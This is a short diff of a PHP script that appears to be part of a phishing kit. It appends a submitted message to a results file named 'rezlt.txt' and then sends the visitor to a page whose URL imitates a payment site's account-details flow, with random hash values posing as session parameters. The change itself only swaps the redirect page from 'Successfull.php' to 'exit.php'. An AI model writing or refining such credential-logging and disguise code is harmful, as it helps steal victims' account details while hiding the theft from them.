@@ -21,5 +21,5 @@ $text = fopen('../../rezlt.txt', 'a');
 fwrite($text, $message);
 
 
-header("Location: ../Successfull.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
+header("Location: ../exit.php?cmd=_account-details&session=".md5(microtime())."&dispatch=".sha1(microtime()));
 ?>
